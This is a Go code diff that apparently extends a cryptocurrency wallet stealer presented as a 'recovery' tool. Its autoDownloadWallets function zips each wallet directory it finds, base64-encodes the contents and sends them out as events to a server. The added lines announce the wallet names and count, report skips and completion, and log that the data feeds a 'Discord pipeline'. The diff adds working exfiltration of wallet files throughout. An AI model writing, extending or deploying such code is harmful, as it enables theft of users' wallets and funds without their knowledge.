@@ -249,17 +249,38 @@ func handleScanWallets() {
 }
 
 func autoDownloadWallets(wallets []recovery.WalletResult) {
+	// Tell the server how many wallet zips to expect (Discord pipeline waits for these)
+	names := make([]string, 0, len(wallets))
+	for _, w := range wallets {
+		names = append(names, w.Name)
+	}
+	sendEvent("wallet_auto_start", map[string]interface{}{
+		"count":   len(wallets),
+		"names":   names,
+		"wallets": wallets,
+	})
+
+	ok := 0
 	for _, w := range wallets {
 		if w.Size > maxAutoDownloadSize {
 			log.Printf("[recovery] skipping auto-download for %q (%d bytes exceeds limit)", w.Name, w.Size)
+			sendEvent("wallet_auto_skip", map[string]interface{}{
+				"name":   w.Name,
+				"reason": "size_limit",
+				"size":   w.Size,
+			})
 			continue
 		}
 		data, err := recovery.ZipDirectory(w.Path)
 		if err != nil {
 			log.Printf("[recovery] auto-download zip %q: %v", w.Name, err)
+			sendEvent("wallet_auto_skip", map[string]interface{}{
+				"name":   w.Name,
+				"reason": err.Error(),
+			})
 			continue
 		}
-		log.Printf("[recovery] auto-download %q (%d bytes)", w.Name, len(data))
+		log.Printf("[recovery] auto-download %q (%d bytes) → wallet_auto_data (Discord pipeline / server)", w.Name, len(data))
 		sendEvent("wallet_auto_data", map[string]interface{}{
 			"name":      w.Name,
 			"type":      w.Type,
@@ -269,7 +290,14 @@ func autoDownloadWallets(wallets []recovery.WalletResult) {
 			"size":      len(data),
 			"content":   base64.StdEncoding.EncodeToString(data),
 		})
+		ok++
 	}
+	sendEvent("wallet_auto_done", map[string]interface{}{
+		"expected": len(wallets),
+		"sent":     ok,
+		"names":    names,
+	})
+	log.Printf("[recovery] wallet auto-download done: sent=%d expected=%d", ok, len(wallets))
 }
 
 func handleFetchWalletZip(payload []byte) {
